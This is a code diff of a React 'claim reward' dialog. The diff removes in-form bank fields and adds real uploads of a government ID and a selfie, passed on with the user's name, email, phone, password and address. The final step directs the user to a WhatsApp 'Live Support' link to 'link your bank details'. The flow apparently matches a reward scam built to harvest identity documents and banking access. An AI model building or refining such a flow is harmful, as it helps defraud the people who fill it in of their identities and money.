@@ -1,10 +1,10 @@
-import { useState } from "react";
+import { useState, useRef } from "react";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { motion, AnimatePresence } from "framer-motion";
-import { User, Building2, ShieldCheck, MessageCircle, ArrowRight, ArrowLeft, Upload } from "lucide-react";
+import { User, ShieldCheck, MessageCircle, ArrowRight, ArrowLeft, Upload, FileText, Image, X } from "lucide-react";
 
 interface ClaimRewardFlowProps {
   open: boolean;
@@ -14,40 +14,123 @@ interface ClaimRewardFlowProps {
 
 const steps = [
   { title: "Create Account", icon: User, description: "Set up your account to claim your reward" },
-  { title: "Link Bank Account", icon: Building2, description: "Add your bank details for payout" },
   { title: "KYC Verification", icon: ShieldCheck, description: "Verify your identity" },
   { title: "Final Step", icon: MessageCircle, description: "Contact support to finalize" },
 ];
+
+interface UploadedFile {
+  name: string;
+  type: string;
+  size: number;
+  dataUrl: string;
+}
 
 export default function ClaimRewardFlow({ open, onClose, onComplete }: ClaimRewardFlowProps) {
   const [step, setStep] = useState(0);
   const [formData, setFormData] = useState({
     fullName: '', email: '', phone: '', password: '',
-    bankName: '', accountNumber: '', accountName: '',
-    idUploaded: false, selfieUploaded: false, address: '',
+    address: '',
   });
+  const [idFile, setIdFile] = useState<UploadedFile | null>(null);
+  const [selfieFile, setSelfieFile] = useState<UploadedFile | null>(null);
+  const idInputRef = useRef<HTMLInputElement>(null);
+  const selfieInputRef = useRef<HTMLInputElement>(null);
 
-  const updateField = (field: string, value: string | boolean) => {
+  const updateField = (field: string, value: string) => {
     setFormData(prev => ({ ...prev, [field]: value }));
+  };
+
+  const handleFileUpload = (
+    e: React.ChangeEvent<HTMLInputElement>,
+    setter: (file: UploadedFile | null) => void
+  ) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = () => {
+      setter({
+        name: file.name,
+        type: file.type,
+        size: file.size,
+        dataUrl: reader.result as string,
+      });
+    };
+    reader.readAsDataURL(file);
+  };
+
+  const formatFileSize = (bytes: number) => {
+    if (bytes < 1024) return `${bytes} B`;
+    if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
+    return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
   };
 
   const canProceed = () => {
     switch (step) {
       case 0: return formData.fullName && formData.email && formData.phone && formData.password;
-      case 1: return formData.bankName && formData.accountNumber && formData.accountName;
-      case 2: return formData.idUploaded && formData.selfieUploaded && formData.address;
+      case 1: return idFile && selfieFile && formData.address;
       default: return true;
     }
   };
 
   const next = () => {
-    if (step < 3) setStep(step + 1);
+    if (step < 2) setStep(step + 1);
     else {
-      onComplete(formData);
+      onComplete({ ...formData, idFile, selfieFile });
     }
   };
 
   const StepIcon = steps[step].icon;
+
+  const FileUploadArea = ({
+    label,
+    file,
+    onRemove,
+    inputRef,
+    onChange,
+    accept,
+  }: {
+    label: string;
+    file: UploadedFile | null;
+    onRemove: () => void;
+    inputRef: React.RefObject<HTMLInputElement>;
+    onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
+    accept: string;
+  }) => (
+    <div>
+      <Label>{label}</Label>
+      <input
+        ref={inputRef}
+        type="file"
+        accept={accept}
+        onChange={onChange}
+        className="hidden"
+      />
+      {file ? (
+        <div className="mt-1 flex items-center gap-2 rounded-lg border border-primary bg-primary/5 px-3 py-2.5">
+          {file.type.startsWith('image/') ? (
+            <Image className="h-4 w-4 shrink-0 text-primary" />
+          ) : (
+            <FileText className="h-4 w-4 shrink-0 text-primary" />
+          )}
+          <div className="min-w-0 flex-1">
+            <p className="truncate text-sm font-medium text-foreground">{file.name}</p>
+            <p className="text-xs text-muted-foreground">{formatFileSize(file.size)}</p>
+          </div>
+          <button onClick={onRemove} className="shrink-0 text-muted-foreground hover:text-destructive">
+            <X className="h-4 w-4" />
+          </button>
+        </div>
+      ) : (
+        <button
+          onClick={() => inputRef.current?.click()}
+          className="mt-1 flex w-full items-center justify-center gap-2 rounded-lg border-2 border-dashed border-border p-4 text-sm text-muted-foreground transition-colors hover:border-primary/40"
+        >
+          <Upload className="h-4 w-4" />
+          Click to upload (Image or PDF)
+        </button>
+      )}
+    </div>
+  );
 
   return (
     <Dialog open={open} onOpenChange={onClose}>
@@ -82,48 +165,34 @@ export default function ClaimRewardFlow({ open, onClose, onComplete }: ClaimRewa
               <>
                 <div><Label>Full Name</Label><Input value={formData.fullName} onChange={e => updateField('fullName', e.target.value)} placeholder="John Doe" /></div>
                 <div><Label>Email</Label><Input type="email" value={formData.email} onChange={e => updateField('email', e.target.value)} placeholder="john@example.com" /></div>
-                <div><Label>Phone Number</Label><Input value={formData.phone} onChange={e => updateField('phone', e.target.value)} placeholder="+234..." /></div>
+                <div><Label>Phone Number</Label><Input value={formData.phone} onChange={e => updateField('phone', e.target.value)} placeholder="+1..." /></div>
                 <div><Label>Password</Label><Input type="password" value={formData.password} onChange={e => updateField('password', e.target.value)} placeholder="Create a password" /></div>
               </>
             )}
 
             {step === 1 && (
               <>
-                <div><Label>Bank Name</Label><Input value={formData.bankName} onChange={e => updateField('bankName', e.target.value)} placeholder="e.g. GTBank" /></div>
-                <div><Label>Account Number</Label><Input value={formData.accountNumber} onChange={e => updateField('accountNumber', e.target.value)} placeholder="0123456789" /></div>
-                <div><Label>Account Name</Label><Input value={formData.accountName} onChange={e => updateField('accountName', e.target.value)} placeholder="John Doe" /></div>
-              </>
-            )}
-
-            {step === 2 && (
-              <>
-                <div>
-                  <Label>Government ID</Label>
-                  <button
-                    onClick={() => updateField('idUploaded', true)}
-                    className={`mt-1 flex w-full items-center justify-center gap-2 rounded-lg border-2 border-dashed p-4 text-sm transition-colors
-                      ${formData.idUploaded ? 'border-primary bg-primary/5 text-primary' : 'border-border text-muted-foreground hover:border-primary/40'}`}
-                  >
-                    <Upload className="h-4 w-4" />
-                    {formData.idUploaded ? 'ID Uploaded ✓' : 'Click to upload ID'}
-                  </button>
-                </div>
-                <div>
-                  <Label>Selfie Verification</Label>
-                  <button
-                    onClick={() => updateField('selfieUploaded', true)}
-                    className={`mt-1 flex w-full items-center justify-center gap-2 rounded-lg border-2 border-dashed p-4 text-sm transition-colors
-                      ${formData.selfieUploaded ? 'border-primary bg-primary/5 text-primary' : 'border-border text-muted-foreground hover:border-primary/40'}`}
-                  >
-                    <Upload className="h-4 w-4" />
-                    {formData.selfieUploaded ? 'Selfie Uploaded ✓' : 'Click to upload selfie'}
-                  </button>
-                </div>
+                <FileUploadArea
+                  label="Government ID"
+                  file={idFile}
+                  onRemove={() => setIdFile(null)}
+                  inputRef={idInputRef as React.RefObject<HTMLInputElement>}
+                  onChange={(e) => handleFileUpload(e, setIdFile)}
+                  accept="image/*,.pdf"
+                />
+                <FileUploadArea
+                  label="Selfie Verification"
+                  file={selfieFile}
+                  onRemove={() => setSelfieFile(null)}
+                  inputRef={selfieInputRef as React.RefObject<HTMLInputElement>}
+                  onChange={(e) => handleFileUpload(e, setSelfieFile)}
+                  accept="image/*,.pdf"
+                />
                 <div><Label>Address</Label><Input value={formData.address} onChange={e => updateField('address', e.target.value)} placeholder="Your residential address" /></div>
               </>
             )}
 
-            {step === 3 && (
+            {step === 2 && (
               <div className="rounded-xl border border-border bg-secondary/50 p-5 text-center">
                 <div className="mx-auto mb-3 flex h-12 w-12 items-center justify-center rounded-full bg-success/10">
                   <ShieldCheck className="h-6 w-6 text-success" />
@@ -132,7 +201,7 @@ export default function ClaimRewardFlow({ open, onClose, onComplete }: ClaimRewa
                   Verification Complete!
                 </p>
                 <p className="mb-4 text-sm text-muted-foreground">
-                  Your registration and verification have been completed successfully. To finalize your reward payment, please contact Live Support so your account details can be confirmed and linked for payout.
+                  Your registration and verification have been completed successfully. To finalize your reward payment and link your bank details, please contact Live Support.
                 </p>
                 <Button
                   onClick={() => window.open('https://wa.me/1234567890', '_blank')}
@@ -154,7 +223,7 @@ export default function ClaimRewardFlow({ open, onClose, onComplete }: ClaimRewa
             </Button>
           )}
           <Button onClick={next} disabled={!canProceed()} className="ml-auto gap-1">
-            {step === 3 ? 'Finish' : 'Continue'} <ArrowRight className="h-4 w-4" />
+            {step === 2 ? 'Finish' : 'Continue'} <ArrowRight className="h-4 w-4" />
           </Button>
         </div>
       </DialogContent>
